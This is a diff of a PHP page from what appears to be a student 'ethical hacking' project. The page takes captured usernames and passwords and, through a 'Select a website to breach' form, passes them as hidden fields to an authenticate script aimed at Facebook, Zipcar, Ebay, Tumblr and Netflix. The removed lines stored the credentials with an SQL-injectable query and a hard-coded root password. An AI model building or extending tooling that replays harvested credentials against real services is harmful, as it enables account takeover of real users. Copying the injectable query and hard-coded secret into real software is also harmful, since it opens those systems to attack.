@@ -38,32 +38,6 @@ echo "<table>
           </tr>
       </table>";
 
-// Insert the credentials to the database
-echo "<p>Adding to database...</p>";
-
-$servername = "localhost";
-$username = "root";
-$password = "ethicalhacking";
-$db = "ethicalhackingteam2";
-
-// Create connection
-$conn = mysqli_connect($servername, $username, $password, $db);
-
-// Check connection
-if (!$conn) {
-    die("Connection failed: " . mysqli_connect_error());
-}
-
-// Create insert query
-$insert = "INSERT INTO " . $db . " (username, password) VALUES ('" . $user . "','" . $pass . "')";
-
-// Perform the query
-if (mysqli_query($conn, $insert)) {
-    echo "<p>Added successfully</p>";
-} else {
-    echo "Adding to database failed: " . mysqli_error($conn);
-}
-
 // Add script to show which are selected
 echo "<script>";
 echo "function getSelectedValues(select) {
@@ -78,24 +52,27 @@ echo "function getSelectedValues(select) {
               }
           }
           document.getElementById('selectedText').innerHTML = result.join(', '); 
+      }
+      function submitForm() {
+          document.body.style.cursor='progress';
       }";
 echo "</script>";
 
 // Attempt to autheticate to several well-known websites - add a selector to do so
 echo "<div id='breach'>";
 echo "<p>Select a website to breach:</p>";
-echo "<form id='selectForm' name='selectForm' method='get' action='authenticate.php'>";
+echo "<form id='selectForm' name='selectForm' method='get' action='authenticate.php' onsubmit='submitForm()'>";
 echo "<select id='breachSelector' name='breachSelector[]' multiple onChange='getSelectedValues(this)'>
-          <option value='twitch' selected>Twitch</option>
-          <option value='amazon'>Amazon</option>
+          <option value='facebook' selected>Facebook</option>
+          <option value='zipcar' selected>Zipcar</option>
+          <option value='ebay' selected>Ebay</option>
+          <option value='tumblr' selected>Tumblr</option>
+          <option value='netflix' selected>Netflix</option>
       </select>";
-echo "<p id='selectedText'>Twitch</p>";
+echo "<p id='selectedText'>Facebook, Zipcar, Ebay, Tumblr, Netflix</p>";
 echo "<input type='submit' name='submit' value='Submit'/>";
 echo "<input type='hidden' name='username' value='" . $user . "'/>";
-echo "<input type='hidden' name='password' value='" . $user . "'/>";
+echo "<input type='hidden' name='password' value='" . $pass . "'/>";
 echo "</form>";
 echo "</div>";
-
-// Close database connection
-mysqli_close();
 ?>
